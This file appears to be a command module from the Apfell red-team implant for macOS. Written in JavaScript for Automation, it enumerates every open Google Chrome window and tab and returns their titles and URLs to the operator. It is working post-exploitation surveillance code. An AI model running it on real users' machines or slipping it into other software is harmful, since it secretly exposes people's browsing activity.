exports.chrome_tabs = function(task, command, params){
	let tabs = [];
	try{
		let ch = Application("Google Chrome");
		if(ch.running()){
            for (let i = 0; i < ch.windows.length; i++){
                let win = ch.windows[i];
                for (let j = 0; j < win.tabs.length; j++){
                    let tab = win.tabs[j];
                    let info = "Title: " + tab.title() +
                    "\nURL: " + tab.url() +
                    "\nWin/Tab: " + i + "/" + j;
                    tabs.push(info);
                }
            }
        }else{
            return JSON.stringify({"user_output": "Chrome is not running", "completed": true, "status": "error"});
        }
	}catch(error){
		let err = error.toString();
		if(err === "Error: An error occurred."){
		    err += " Apfell was denied access to Google Chrome (either by popup or prior deny).";
		}
		return JSON.stringify({"user_output":err, "completed": true, "status": "error"});
	}
	return JSON.stringify({"user_output":tabs, "completed": true});
};
COMMAND_ENDS_HERE